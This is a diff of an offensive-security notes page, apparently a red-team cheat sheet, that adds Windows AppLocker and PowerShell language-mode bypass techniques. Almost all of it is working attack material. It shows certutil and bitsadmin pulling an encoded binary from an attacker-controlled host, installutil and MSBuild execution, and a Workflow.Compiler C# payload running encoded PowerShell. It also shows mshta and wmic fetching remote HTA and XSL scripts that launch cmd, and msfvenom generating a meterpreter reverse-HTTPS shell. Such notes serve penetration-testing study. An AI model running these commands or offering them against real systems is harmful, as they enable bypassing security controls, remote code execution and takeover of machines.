@@ -146,9 +146,15 @@ wscript "C:\Users\Rick.Sanchez\Random_log.log"
 
 A combination of AppLocker and CLM bypass
 
+Note: you must add a reference before compiling.&#x20;
 
-
+{% hint style="info" %}
 ```
+C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35
+```
+{% endhint %}
+
+```csharp
 using System;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
@@ -186,8 +192,137 @@ namespace Bypass
     
 ```
 
-Using Uninstalls to bypass Applocker
+Using Uninstalls to bypass Applocker and bitsadmin to transfer file
 
 ```
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
+Attacker > certutil -encode C:\Users\Rick.Sanchez\Bypass.exe bypass.txt
+Target > bitsadmin /Transfer myJob http://192.168.0.1/bypass.txt C:\Users\Rick.Sanchez\bypass.txt
+Target > certutil -decode C:\Users\Rick.Sanchez\bypass.txt C:\Users\Rick.Sanchez\bypass.exe && del C:\Users\Rick.Sanchez\bypass.txt
+Target > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Rick.Sanchez\Bypass.exe
+```
+
+### Microsoft.Workflow.Compiler.exe
+
+Payload is C# code as txt file
+
+&#x20;
+
+```
+using System;
+using System.Diagnostics;
+using System.Workflow.ComponentModel;
+public class Run : Activity{
+    public Run() {
+	    Process process = new Process();
+            // Configure the process using the StartInfo properties.
+            process.StartInfo.FileName = "powershell.exe";
+            process.StartInfo.Arguments = "powershell.exe -enc <ENCODED PS Payload>";
+            process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
+            process.Start();
+            process.WaitForExit();
+            Console.WriteLine("I executed!");
+    }
+}
+```
+
+Commands to run
+
+```
+$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
+$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
+$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
+Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
+$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
+$compilerparam.GenerateInMemory = $True
+$pathvar = "C:\Users\Rick.Sanchez\test.txt"
+$output = "C:\Users\Rick.Sanchez\run.xml"
+$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
+Move-Item $tmp $output
+
+$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“Rick.Sanchez”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
+
+C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe C:\Users\Rick.Sanchez\run.xml C:\Users\Rick.Sanchez\results.xml
+```
+
+### MSBUILD
+
+Using XML Template from here
+
+[https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c](https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c)
+
+Execute Payload
+
+```
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Rick.Sanchez\Desktop\evil.xml
+```
+
+### MSHTA
+
+```
+mshta.exe http://192.168.0.1/test.hta
+```
+
+Test.hta file on Web Server will open cmd.exe
+
+```html
+<html> 
+<head> 
+<script language="JScript">
+<!--- PASTE JSCRIPT PAYLOAD BELOW --->
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("cmd.exe");
+<!--- PASTE JSCRIPT ABOVE--->
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
+```
+
+The MSHTA.exe filepath used is a x64 exe
+
+Generate payload
+
+```
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.115 LPORT=443 -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin
+```
+
+SuperSharpShooter
+
+```
+./SuperSharpShooter.py --dotnetver 4 --payload js --rawscfile rawsc.bin --output test --stageless
+```
+
+Copy Jscript payload created into test.hta template
+
+
+
+### WMIC
+
+On Target
+
+```
+wmic process get brief /format:"http://192.168.0.1/test.xsl"
+```
+
+XSL Template
+
+```
+<?xml version='1.0'?>
+<stylesheet version="1.0"
+xmlns="http://www.w3.org/1999/XSL/Transform"
+xmlns:ms="urn:schemas-microsoft-com:xslt"
+xmlns:user="http://mycompany.com/mynamespace">
+
+<output method="text"/>
+	<ms:script implements-prefix="user" language="JScript">
+		<![CDATA[
+			var r = new ActiveXObject("WScript.Shell");
+			r.Run("cmd.exe");
+		]]>
+	</ms:script>
+</stylesheet>
 ```
